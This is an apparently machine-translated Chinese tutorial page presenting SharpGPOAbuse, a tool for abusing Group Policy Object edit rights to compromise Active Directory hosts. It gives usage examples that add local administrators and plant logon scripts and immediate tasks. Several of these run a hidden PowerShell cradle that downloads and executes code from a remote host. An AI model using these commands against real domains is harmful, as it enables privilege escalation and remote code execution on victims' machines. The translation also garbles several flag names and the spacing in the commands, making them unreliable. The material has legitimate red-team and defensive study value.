# SharpGPOAbuse:利用用户对组策略对象(GPO)的编辑权限的工具

> 原文：<https://kalilinuxtutorials.com/sharpgpoabuse/>

[![SharpGPOAbuse : Tool To Take Advantage Of A User’s Edit Rights On A Group Policy Object (GPO)](img/c1f00f6974f6ba1aa6d4196ca766b6a7.png "SharpGPOAbuse : Tool To Take Advantage Of A User’s Edit Rights On A Group Policy Object (GPO)")](https://1.bp.blogspot.com/-atr0fF1EIwc/YG94aERnLUI/AAAAAAAAIsE/cjPLzFz35H4ijKBLEbgwoBU0IV0DtrAMwCLcBGAsYHQ/s728/SharpGPOAbuse%25281%2529.png)

**shargpoabuse**是一个用 C#编写的. NET 应用程序，可以用来利用用户对组策略对象(GPO)的编辑权限来危害由该 GPO 控制的对象。

更多细节可以在下面的博客中找到:[https://labs.mwrinfosecurity.com/tools/sharpgpoabuse](https://labs.mwrinfosecurity.com/tools/sharpgpoabuse)

**编译指令**

确保正确安装了必要的 NuGet 包，并在 Visual Studio 中简单地构建项目。

**用途**

**用法:SharpGPOAbuse.exe<攻击类型> <攻击选项>**

**攻击类型**

目前 SharpGPOAbuse 支持以下选项:

| [计]选项 | 描述 |
| --- | --- |
| [–AddUserRights](https://github.com/FSecureLABS/SharpGPOAbuse#adding-user-rights) | 向用户添加权限 |
| [–addlocalaadmin](https://github.com/FSecureLABS/SharpGPOAbuse#adding-a-local-admin) | 将用户添加到本地管理员组 |
| [–addcomputerscript](https://github.com/FSecureLABS/SharpGPOAbuse#configuring-a-user-or-computer-logon-script) | 添加新的计算机启动脚本 |
| [–AddUserScript](https://github.com/FSecureLABS/SharpGPOAbuse#configuring-a-user-or-computer-logon-script) | 配置用户登录脚本 |
| [–添加计算机任务](https://github.com/FSecureLABS/SharpGPOAbuse#configuring-a-computer-or-user-immediate-task) | 配置计算机即时任务 |
| [–AddUserTask](https://github.com/FSecureLABS/SharpGPOAbuse#configuring-a-computer-or-user-immediate-task) | 向用户添加即时任务 |

**攻击选项**

*   **添加用户权限**

**添加新用户权限所需的选项:
–user rights
设置要添加给用户的新权限。此选项区分大小写，必须使用逗号分隔的列表。
–user account
设置添加新权限的账户。
–GPO name
易受攻击的 GPO 的名称。

例如:
SharpGPOAbuse.exe–adduser rights–user rights " SeTakeOwnershipPrivilege，SeRemoteInteractiveLogonRight "-user account bob . Smith–GPOName " Vulnerable GPO "**

*   **添加本地管理员**

**添加新的本地管理员所需的选项:
–user account
设置要添加到本地管理员中的帐户名称。
–GPOName
易受攻击的 GPO 的名称。

示例:
SharpGPOAbuse.exe–addlocalaadmin–user account bob . Smith–GPOName“易受攻击的 GPO”**

*   **配置用户或计算机登录脚本**

添加新用户或计算机启动脚本所需的选项:
–script name
设置新启动脚本的名称。
–script contents
设置新启动脚本的内容。
–GPOName
易受攻击的 GPO 的名称。

示例:
SharpGPOAbuse.exe–AddUserScript–script name startup script . bat–script contents " powershell . exe-nop-w hidden-c \ " IEX((new-object net . webclient)。download string(' http://10 . 1 . 1 . 10:80/a ')\ " "–GPO name "易受攻击的 GPO "

如果希望仅在受易受攻击的 GPO 控制的特定用户或计算机上运行恶意脚本，可以在恶意脚本中添加 If 语句:

SharpGPOAbuse.exe–AddUserScript–script name startup script . bat–script contents " if % username % = = powershell.exe-nop-w hidden-c \ " IEX((new-object net . webclient)。download string(' http://10 . 1 . 1 . 10:80/a ')\ " "–GPO name "易受攻击的 GPO "

*   **配置计算机或用户即时任务**

**选项需要添加一个新的计算机或用户即时任务:**

–TaskName
设置新计算机任务的名称。
–作者
设置新任务的作者(使用阿达账号)。
–命令
要执行的命令。
–参数
传递给命令的参数。
–GPO name
易受攻击的 GPO 的名称。

**附加用户任务选项:**

–filter enabled
为用户即时任务启用目标过滤。
–目标用户名
目标用户。恶意任务将只在指定用户上运行。应该是目标用户的 SID 格式\
–TargetUserSID
。

**附加计算机任务选项:**
–filter enabled
为计算机即时任务启用目标过滤。
–TargetDnsName
目标计算机的 DNS 名称。恶意任务将只在指定的主机上运行。

**举例:**
SharpGPOAbuse.exe–AddComputerTask–TaskName“更新”-作者域\管理员–命令“cmd . exe”-参数“/c powershell.exe-nop-w hidden-c \ " IEX((new-object net . webclient)。download string(' http://10 . 1 . 1 . 10:80/a ')\ " "–GPO name "易受攻击的 GPO "

如果您希望仅在受易受攻击的 GPO 控制的特定用户或计算机上运行恶意任务，您可以使用类似于以下内容的内容:

SharpGPOAbuse.exe–AddComputerTask–TaskName " Update "–Author DOMAIN \ Admin–Command " cmd . exe "–Arguments "/c powershell.exe-nop-w hidden-c \ " IEX((new-object net . webclient)。download string(' http://10 . 1 . 1 . 10:80/a ')\ " "–GPO name " Vulnerable GPO "-filter enabled–TargetDnsName target.domain.com

**附加选项**

| [计]选项 | 描述 |
| --- | --- |
| –域控制器 | 设置目标域控制器 |
| –域 | 设置目标域 |
| –力 | 如果需要，覆盖现有文件 |

[**Download**](https://github.com/FSecureLABS/SharpGPOAbuse)